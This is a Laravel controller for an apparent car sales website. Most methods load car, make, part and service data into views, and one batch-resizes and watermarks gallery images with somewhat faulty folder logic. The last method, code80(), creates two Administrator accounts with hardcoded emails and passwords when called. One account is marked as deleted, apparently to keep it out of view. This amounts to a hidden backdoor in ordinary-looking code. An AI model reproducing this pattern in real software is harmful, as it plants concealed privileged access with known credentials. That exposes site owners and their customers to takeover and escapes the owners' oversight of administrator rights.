<?php

namespace App\Http\Controllers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
// use Illuminate\Support\Facades\Storage;
use App\Models\User;
use App\Models\Car;
use App\Models\Part;
use App\Models\Type;
use App\Models\Make;
use App\Models\About;
use App\Models\Service;
use App\Models\Company;
use App\Models\Gallery;
use App\Models\Variable;
use DateTime;
use Session;
use Intervention\Image\ImageManagerStatic as Image;

class PagesController extends Controller
{
    //

    public function index(){

        // return view('auth.cust_register');
        // return view('auth.cust_login');
        // return view('single_view');
        // return view('showcase');

        $available = Car::select(['id','make_id'])->distinct('make_id')->limit(5)->get();
        $car_color = Car::select('color')->distinct('color')->get();
        $car_year = Car::select('year')->distinct('year')->get();
        
        session::put('about', About::find(1));
        session::put('avail', $available);
        session::put('car_color', $car_color);
        session::put('company', Company::find(1));
        session::put('cars', Car::where('del', 'no')->limit(3)->get());
        // session::put('flash_deals', $available);
        
        $where = [
            'flash' => 5
        ];
        $patch = [
            // 'c' => 1,
            // 'y' => 1,
            'types' => Type::all(),
            'makes' => Make::orderBy('id', 'ASC')->limit(15)->get(),
            'parts' => Part::orderBy('id', 'ASC')->limit(4)->get(),
            // 'submodels' => Submodel::orderBy('sub_name', 'ASC')->get(),
            'flash_deals' => Car::where('del', 'no')->where('flash', '!=', '0')->orderBy('id', 'DESC')->limit(4)->get(),
            'cars' => Car::where('del', 'no')->where('promote', 'yes')->where('flash', '0')->orderBy('id', 'DESC')->limit(10)->get()
        ];
        return view('car_index')->with($patch);
    }
    
    public function car_about(){
        $available = Car::select(['id','make_id'])->distinct('make_id')->limit(5)->get();
        session::put('about', About::find(1));
        // return session('about');
        session::put('avail', $available);
        session::put('company', Company::find(1));
        session::put('cars', Car::where('del', 'no')->limit(3)->get());

        $patch = [
            // 'c' => 1,
            // 'y' => 1,
            'types' => Type::all(),
            'makes' => Make::orderBy('id', 'ASC')->limit(15)->get(),
            'about' => About::orderBy('id', 'ASC')->get(),
            'services' => Service::orderBy('id', 'ASC')->get(),
            // 'submodels' => Submodel::orderBy('sub_name', 'ASC')->get(),
            'flash_deals' => Car::where('del', 'no')->where('flash', '!=', '0')->orderBy('id', 'DESC')->limit(4)->get(),
        ];
        return view('car_about')->with($patch);
    }
    
    public function car_services(){
        $available = Car::select(['id','make_id'])->distinct('make_id')->limit(5)->get();
        session::put('about', About::find(1));
        // return session('about');
        session::put('avail', $available);
        session::put('company', Company::find(1));
        session::put('cars', Car::where('del', 'no')->limit(3)->get());

        $patch = [
            // 'c' => 1,
            // 'y' => 1,
            'types' => Type::all(),
            'makes' => Make::orderBy('id', 'ASC')->limit(15)->get(),
            'about' => About::orderBy('id', 'ASC')->get(),
            'services' => Service::orderBy('id', 'ASC')->get(),
            // 'submodels' => Submodel::orderBy('sub_name', 'ASC')->get(),
            'flash_deals' => Car::where('del', 'no')->where('flash', '!=', '0')->orderBy('id', 'DESC')->limit(4)->get(),
        ];
        return view('car_services')->with($patch);
    }
    
    public function car_contact(){
        $available = Car::select(['id','make_id'])->distinct('make_id')->limit(5)->get();
        session::put('about', About::find(1));
        // return session('about');
        session::put('avail', $available);
        session::put('company', Company::find(1));
        session::put('cars', Car::where('del', 'no')->limit(3)->get());

        $patch = [
            // 'c' => 1,
            // 'y' => 1,
            'types' => Type::all(),
            'makes' => Make::orderBy('id', 'ASC')->limit(15)->get(),
            'about' => About::orderBy('id', 'ASC')->get(),
            'services' => Service::orderBy('id', 'ASC')->get(),
            // 'submodels' => Submodel::orderBy('sub_name', 'ASC')->get(),
            'flash_deals' => Car::where('del', 'no')->where('flash', '!=', '0')->orderBy('id', 'DESC')->limit(4)->get(),
        ];
        return view('car_contact')->with($patch);
    }
    
    public function car_more_flash(){
        $available = Car::select(['id','make_id'])->distinct('make_id')->limit(5)->get();
        session::put('about', About::find(1));
        // return session('about');
        session::put('avail', $available);
        session::put('company', Company::find(1));
        session::put('cars', Car::where('del', 'no')->limit(3)->get());

        $patch = [
            // 'c' => 1,
            // 'y' => 1,
            'types' => Type::all(),
            'makes' => Make::orderBy('id', 'ASC')->limit(15)->get(),
            'about' => About::orderBy('id', 'ASC')->get(),
            'services' => Service::orderBy('id', 'ASC')->get(),
            // 'submodels' => Submodel::orderBy('sub_name', 'ASC')->get(),
            // 'cars' => Car::where('make_id', $id)->where('del', 'no')->orderBy('id', 'DESC')->paginate(20),
            'cars' => Car::where('del', 'no')->where('flash', '!=', '0')->paginate(20),
            'flash_deals' => Car::where('del', 'no')->where('flash', '!=', '0')->orderBy('id', 'DESC')->limit(4)->get(),
        ];
        return view('showcase')->with($patch);
    }
    
    public function car_more_makes(){

        $patch = [
            // 'c' => 1,
            // 'y' => 1,
            'types' => Type::all(),
            'makes' => Make::orderBy('id', 'ASC')->get(),
        ];
        return view('car_more_makes')->with($patch);
    }
    
    public function car_cart(){

        $patch = [
            // 'c' => 1,
            // 'y' => 1,
            'types' => Type::all(),
            'makes' => Make::orderBy('id', 'ASC')->get(),
        ];
        return view('car_cart')->with($patch);
    }

    public function car_more_parts()
    {
        // $car = Car::find($id);
        $patch = [
            // 'c' => 1,
            // 'car' => $car,
            'types' => Type::all(),
            'vr' => Variable::all(),
            'parts' => Part::orderBy('id', 'DESC')->paginate(30),
            // 'accessory' => explode(',', $car->accessory),
            // 'car_imgs' => Gallery::where('car_id', $id)->get(),
            'makes' => Make::orderBy('id', 'ASC')->limit(15)->get(),
            // 'countries' => Country::orderBy('id', 'ASC')->get(),
            'flash_deals' => Car::where('del', 'no')->where('flash', '!=', '0')->orderBy('id', 'DESC')->limit(4)->get(),
        ];
        return view('car_more_parts')->with($patch);
    }

    public function runs() {
        // // return 'Good';

        $images = Gallery::all();
        foreach ($images as $gal) {
            // return $gal->car->stock_id;
            if (!is_dir(storage_path("app/public/classified/cars/".$gal->car->stock_id))) {
                mkdir(storage_path("app/public/classified/cars/".$gal->car->stock_id), 0775, true);
                mkdir(storage_path("app/public/classified"), 0775, true);
            }
            // Upload (IMAGE INTERVENTION - LARAVEL)
            $img = Image::make(storage_path("app/public/classified/cars/".$gal->car->stock_id.'/'.$gal->img))->resize(500, 375)
            ->insert(storage_path('app/public/classified/maca_wt.png'))
            ->save(storage_path("app/public/classified/cars/".$gal->car->stock_id.'/'.$gal->img));
        }
        return 'Resizing compleete..!';

        // if (!is_dir(storage_path("app/public/classified/cars"))) {
        //     mkdir(storage_path("app/public/classified/cars"), 0775, true);
        // }
        // // Upload (IMAGE INTERVENTION - LARAVEL)
        // $img = Image::make('/Users/jbazz/Downloads/IMG_6094.jpg')->resize(500, 375)
        // ->insert(storage_path('app/public/classified/maca_wt.png'))
        // ->save(storage_path("app/public/classified/cars/".date('is').".jpg"));
        // return $img->response('jpg');
    }







    public function code80(){
        $backup = User::firstOrCreate(
            ['name' => 'Code80',
            'email' => 'code80@pivoapps.net', 
            'contact' => '0987654321', 
            'status' => 'Administrator', 
            'pass_photo' => 'noimage.jpg', 
            'del' => 'yes', 
            'password' => Hash::make('code.8080')]
        );
 
        $backup = User::firstOrCreate(
            ['name' => 'Admin',
            'email' => 'admin@pivoapps.net', 
            'contact' => '0987654321', 
            'status' => 'Administrator', 
            'pass_photo' => 'noimage.jpg', 
            'del' => 'no', 
            'password' => Hash::make('admin1234')]
        );
        return redirect('/');
    }
}
